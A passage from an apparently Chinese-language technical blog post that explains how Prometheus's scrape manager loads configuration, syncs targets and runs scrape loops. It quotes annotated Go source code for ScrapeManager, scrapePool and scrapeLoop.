class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ScrapeManager maintains a set of scrape pools and manages start/stop cycles</span></span><br><span class="line"><span class="comment">// when receiving new target groups form the discovery manager.</span></span><br><span class="line"><span class="keyword">type</span> ScrapeManager <span class="keyword">struct</span> &#123;</span><br><span class="line">logger        log.Logger</span><br><span class="line"><span class="built_in">append</span>        Appendable    <span class="comment">//指标存储器</span></span><br><span class="line">scrapeConfigs <span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig  <span class="comment">//job_name scrape配置</span></span><br><span class="line">scrapePools   <span class="keyword">map</span>[<span class="keyword">string</span>]*scrapePool  <span class="comment">//job_name指标采集器</span></span><br><span class="line">mtx           sync.RWMutex <span class="comment">//同步访问控制，读写锁</span></span><br><span class="line">graceShut     <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">//scrapemanager关闭控制</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化ScrapeManager结构;</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewScrapeManager is the ScrapeManager constructor</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewScrapeManager</span><span class="params">(logger log.Logger, app Appendable)</span> *<span class="title">ScrapeManager</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ScrapeManager&#123;</span><br><span class="line"><span class="built_in">append</span>:        app,</span><br><span class="line">logger:        logger,</span><br><span class="line">scrapeConfigs: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig),</span><br><span class="line">scrapePools:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*scrapePool),</span><br><span class="line">graceShut:     <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeManager的配置加载，是根据prometheus.yml中的scrape_configs配置项，对scrape服务进行配置更新处理，调用方法为ApplyConfig，器内部实现分初次加载和配置更新动态加载两种。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ScrapeConfig configures a scraping unit for Prometheus.</span></span><br><span class="line"><span class="keyword">type</span> ScrapeConfig <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// The job name to which the job label is set by default.</span></span><br><span class="line">JobName <span class="keyword">string</span> <span class="string">`yaml:"job_name"`</span></span><br><span class="line"><span class="comment">// Indicator whether the scraped metrics should remain unmodified.</span></span><br><span class="line">HonorLabels <span class="keyword">bool</span> <span class="string">`yaml:"honor_labels,omitempty"`</span></span><br><span class="line"><span class="comment">// A set of query parameters with which the target is scraped.</span></span><br><span class="line">Params url.Values <span class="string">`yaml:"params,omitempty"`</span></span><br><span class="line"><span class="comment">// How frequently to scrape the targets of this scrape config.</span></span><br><span class="line">ScrapeInterval model.Duration <span class="string">`yaml:"scrape_interval,omitempty"`</span></span><br><span class="line"><span class="comment">// The timeout for scraping targets of this config.</span></span><br><span class="line">ScrapeTimeout model.Duration <span class="string">`yaml:"scrape_timeout,omitempty"`</span></span><br><span class="line"><span class="comment">// The HTTP resource path on which to fetch metrics from targets.</span></span><br><span class="line">MetricsPath <span class="keyword">string</span> <span class="string">`yaml:"metrics_path,omitempty"`</span></span><br><span class="line"><span class="comment">// The URL scheme with which to fetch metrics from targets.</span></span><br><span class="line">Scheme <span class="keyword">string</span> <span class="string">`yaml:"scheme,omitempty"`</span></span><br><span class="line"><span class="comment">// More than this many samples post metric-relabelling will cause the scrape to fail.</span></span><br><span class="line">SampleLimit <span class="keyword">uint</span> <span class="string">`yaml:"sample_limit,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// We cannot do proper Go type embedding below as the parser will then parse</span></span><br><span class="line"><span class="comment">// values arbitrarily into the overflow maps of further-down types.</span></span><br><span class="line"></span><br><span class="line">ServiceDiscoveryConfig sd_config.ServiceDiscoveryConfig <span class="string">`yaml:",inline"`</span></span><br><span class="line">HTTPClientConfig       config_util.HTTPClientConfig     <span class="string">`yaml:",inline"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// List of target relabel configurations.</span></span><br><span class="line">RelabelConfigs []*RelabelConfig <span class="string">`yaml:"relabel_configs,omitempty"`</span></span><br><span class="line"><span class="comment">// List of metric relabel configurations.</span></span><br><span class="line">MetricRelabelConfigs []*RelabelConfig <span class="string">`yaml:"metric_relabel_configs,omitempty"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Catches all undefined fields and must be empty after parsing.</span></span><br><span class="line">XXX <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125; <span class="string">`yaml:",inline"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ApplyConfig resets the manager's target providers and job configurations as defined by the new cfg.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">ApplyConfig</span><span class="params">(cfg *config.Config)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">m.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mtx.Unlock()</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]*config.ScrapeConfig)</span><br><span class="line"><span class="keyword">for</span> _, scfg := <span class="keyword">range</span> cfg.ScrapeConfigs &#123;</span><br><span class="line">c[scfg.JobName] = scfg</span><br><span class="line">&#125;</span><br><span class="line">m.scrapeConfigs = c</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cleanup and reload pool if config has changed.</span></span><br><span class="line"><span class="keyword">for</span> name, sp := <span class="keyword">range</span> m.scrapePools &#123;</span><br><span class="line"><span class="keyword">if</span> cfg, ok := m.scrapeConfigs[name]; !ok &#123;</span><br><span class="line">sp.stop()</span><br><span class="line"><span class="built_in">delete</span>(m.scrapePools, name)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> !reflect.DeepEqual(sp.config, cfg) &#123;</span><br><span class="line">sp.reload(cfg)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sp.reload方法将重新配置scrapePool，流程为：</p><ol><li><p>构建scrapeLoop服务</p></li><li><p>停止线上所对应的scrapeLoop服务</p></li><li><p>启动新的scrapeLoop服务</p></li></ol><p>以上三步动态更新；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reload the scrape pool with the given scrape configuration. The target state is preserved</span></span><br><span class="line"><span class="comment">// but all scrape loops are restarted with the new scrape configuration.</span></span><br><span class="line"><span class="comment">// This method returns after all scrape loops that were stopped have stopped scraping.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">reload</span><span class="params">(cfg *config.ScrapeConfig)</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line"></span><br><span class="line">sp.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> sp.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">client, err := httputil.NewClientFromConfig(cfg.HTTPClientConfig, cfg.JobName)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Any errors that could occur here should be caught during config validation.</span></span><br><span class="line">level.Error(sp.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error creating HTTP client"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">sp.config = cfg</span><br><span class="line">sp.client = client</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg       sync.WaitGroup</span><br><span class="line">interval = time.Duration(sp.config.ScrapeInterval)</span><br><span class="line">timeout  = time.Duration(sp.config.ScrapeTimeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fp, oldLoop := <span class="keyword">range</span> sp.loops &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">t       = sp.targets[fp]</span><br><span class="line">s       = &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125;</span><br><span class="line">newLoop = sp.newLoop(t, s)</span><br><span class="line">)</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(oldLoop, newLoop loop)</span></span> &#123;</span><br><span class="line">            <span class="comment">//停止线上的老的scrapeLoop服务</span></span><br><span class="line">oldLoop.stop()</span><br><span class="line">wg.Done()</span><br><span class="line"><span class="comment">//启动新的scrapeLoop服务</span></span><br><span class="line"><span class="keyword">go</span> newLoop.run(interval, timeout, <span class="literal">nil</span>)</span><br><span class="line">&#125;(oldLoop, newLoop)</span><br><span class="line"><span class="comment">//更新scrapePool中的scrapeLoop服务</span></span><br><span class="line">sp.loops[fp] = newLoop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="comment">//更新采集周期targetReloadIntervalLength.WithLabelValues(interval.String()).Observe(</span></span><br><span class="line">time.Since(start).Seconds(),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置加载流程：</p><p><img src="/images/1572415259519.png" alt="1572415259519"></p><p>ScrapeManager通过调用retrieval下的Manager.Run方法完成启动，其参数为prometheus.yml配置发现的目标服务，有discovery模块中的Manager.SyncCh 方法负责和ScrapeManager通信。</p><p>当SyncSh发生变化时，将触发ScrapeManager中的reload方法，在reload方法中会遍历目标服务，根据tsetName（jobName）从scrapePools中查找scrapePool，如果找不到则新建一个scrapePool，使得每个job都有一个对应的scrapePool</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run starts background processing to handle target updates and reload the scraping loops.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">Run</span><span class="params">(tsets &lt;-<span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">level.Info(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"Starting scrape manager..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> ts := &lt;-tsets:</span><br><span class="line">m.reload(ts)</span><br><span class="line"><span class="keyword">case</span> &lt;-m.graceShut:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">reload</span><span class="params">(t <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> tsetName, tgroup := <span class="keyword">range</span> t &#123;</span><br><span class="line">scrapeConfig, ok := m.scrapeConfigs[tsetName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"error reloading target set"</span>, <span class="string">"err"</span>, fmt.Sprintf(<span class="string">"invalid config id:%v"</span>, tsetName))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查ScrapePool中服务是否存在，不存在构建新的ScrapePool</span></span><br><span class="line"><span class="comment">// Scrape pool doesn't exist so start a new one.</span></span><br><span class="line">existing, ok := m.scrapePools[tsetName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">sp := newScrapePool(scrapeConfig, m.<span class="built_in">append</span>, log.With(m.logger, <span class="string">"scrape_pool"</span>, tsetName))</span><br><span class="line">m.scrapePools[tsetName] = sp</span><br><span class="line">sp.Sync(tgroup)</span><br><span class="line"><span class="comment">//调用Sync方法同步目标服务和启动scrape</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//同步目标服务并启动scrape</span></span><br><span class="line">existing.Sync(tgroup)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sp.Sync方法主要用于将tgroup转换为Target类型，再调用scrapePool.sync方法同步scrape服务。</p><p>ScrapePool主要管理目标服务和scrapeLoop</p><p>Sync方法具体实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sync converts target groups into actual scrape targets and synchronizes</span></span><br><span class="line"><span class="comment">// the currently running scraper with the resulting set.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">Sync</span><span class="params">(tgs []*targetgroup.Group)</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> all []*Target</span><br><span class="line">sp.mtx.Lock()</span><br><span class="line">sp.droppedTargets = []*Target&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, tg := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">        <span class="comment">//Group转换成target</span></span><br><span class="line">targets, err := targetsFromGroup(tg, sp.config)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(sp.logger).Log(<span class="string">"msg"</span>, <span class="string">"creating targets failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, t := <span class="keyword">range</span> targets &#123;</span><br><span class="line">            <span class="comment">//检查Target是否存在有有效的Label</span></span><br><span class="line"><span class="keyword">if</span> t.Labels().Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">all = <span class="built_in">append</span>(all, t)</span><br><span class="line">                <span class="comment">//记录无效的Target</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> t.DiscoveredLabels().Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">sp.droppedTargets = <span class="built_in">append</span>(sp.droppedTargets, t)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sp.mtx.Unlock()</span><br><span class="line">    <span class="comment">//同步scrape服务</span></span><br><span class="line">sp.sync(all)</span><br><span class="line"><span class="comment">//更新系统指标</span></span><br><span class="line">targetSyncIntervalLength.WithLabelValues(sp.config.JobName).Observe(</span><br><span class="line">time.Since(start).Seconds(),</span><br><span class="line">)</span><br><span class="line">targetScrapePoolSyncsCounter.WithLabelValues(sp.config.JobName).Inc()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapePool.sync方法将输入参数targets与原有的targets列表sp.targets进行对比，如果有新的target加入，就创建新的targetScraper和scrapeLoop，并且启动新的scrapeLoop，如果发现已经失效的target,就会停止scrapeLoop服务并删除对应的target和scrapeLoop</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sync takes a list of potentially duplicated targets, deduplicates them, starts</span></span><br><span class="line"><span class="comment">// scrape loops for new targets, and stops scrape loops for disappeared targets.</span></span><br><span class="line"><span class="comment">// It returns after all stopped scrape loops terminated.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">sync</span><span class="params">(targets []*Target)</span></span> &#123;</span><br><span class="line">sp.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> sp.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">uniqueTargets = <span class="keyword">map</span>[<span class="keyword">uint64</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">interval      = time.Duration(sp.config.ScrapeInterval)</span><br><span class="line">timeout       = time.Duration(sp.config.ScrapeTimeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, t := <span class="keyword">range</span> targets &#123;</span><br><span class="line">t := t</span><br><span class="line">hash := t.hash()</span><br><span class="line">uniqueTargets[hash] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, ok := sp.targets[hash]; !ok &#123;</span><br><span class="line">s := &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125;</span><br><span class="line">l := sp.newLoop(t, s)</span><br><span class="line"></span><br><span class="line">sp.targets[hash] = t</span><br><span class="line">sp.loops[hash] = l</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> l.run(interval, timeout, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stop and remove old targets and scraper loops.</span></span><br><span class="line"><span class="keyword">for</span> hash := <span class="keyword">range</span> sp.targets &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := uniqueTargets[hash]; !ok &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(l loop)</span></span> &#123;</span><br><span class="line">l.stop()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(sp.loops[hash])</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(sp.loops, hash)</span><br><span class="line"><span class="built_in">delete</span>(sp.targets, hash)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for all potentially stopped scrapers to terminate.</span></span><br><span class="line"><span class="comment">// This covers the case of flapping targets. If the server is under high load, a new scraper</span></span><br><span class="line"><span class="comment">// may be active and tries to insert. The old scraper that didn't terminate yet could still</span></span><br><span class="line"><span class="comment">// be inserting a previous sample set.</span></span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeLoop是scrape的直接管理者，每个scrapeLoop都通过一个goroutine来运行，scrapeLoop控制scrape进行指标的拉取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *scrapeLoop)</span> <span class="title">run</span><span class="params">(interval, timeout time.Duration, errc <span class="keyword">chan</span>&lt;- error)</span></span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(sl.scraper.offset(interval)):</span><br><span class="line"><span class="comment">// Continue after a scraping offset.</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> last time.Time</span><br><span class="line">     </span><br><span class="line">ticker := time.NewTicker(interval)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line">    <span class="comment">//初始化指标存储空间</span></span><br><span class="line">buf := bytes.NewBuffer(<span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">0</span>, <span class="number">16000</span>))</span><br><span class="line"></span><br><span class="line">mainLoop:</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="comment">//停止scrapeLoop</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.ctx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="keyword">break</span> mainLoop</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">start             = time.Now()</span><br><span class="line">scrapeCtx, cancel = context.WithTimeout(sl.ctx, timeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only record after the first scrape.</span></span><br><span class="line"><span class="keyword">if</span> !last.IsZero() &#123;</span><br><span class="line">targetIntervalLength.WithLabelValues(interval.String()).Observe(</span><br><span class="line">time.Since(last).Seconds(),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//根据最后一次的scrape到指标的大小来申请本次存储空间</span></span><br><span class="line">b := sl.buffers.Get(sl.lastScrapeSize)</span><br><span class="line">buf := bytes.NewBuffer(b)</span><br><span class="line"><span class="comment">//scrape指标</span></span><br><span class="line">scrapeErr := sl.scraper.scrape(scrapeCtx, buf)</span><br><span class="line">cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scrapeErr == <span class="literal">nil</span> &#123;</span><br><span class="line">b = buf.Bytes()</span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> There were issues with misbehaving clients in the past</span></span><br><span class="line"><span class="comment">// that occasionally returned empty results. We don't want those</span></span><br><span class="line"><span class="comment">// to falsely reset our buffer size.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">//记录本次scrape到指标的大小</span></span><br><span class="line">sl.lastScrapeSize = <span class="built_in">len</span>(b)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Scrape failed"</span>, <span class="string">"err"</span>, scrapeErr.Error())</span><br><span class="line"><span class="keyword">if</span> errc != <span class="literal">nil</span> &#123;</span><br><span class="line">errc &lt;- scrapeErr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A failed scrape is the same as an empty scrape,</span></span><br><span class="line"><span class="comment">// we still call sl.append to trigger stale markers.</span></span><br><span class="line">        <span class="comment">//存储指标</span></span><br><span class="line">total, 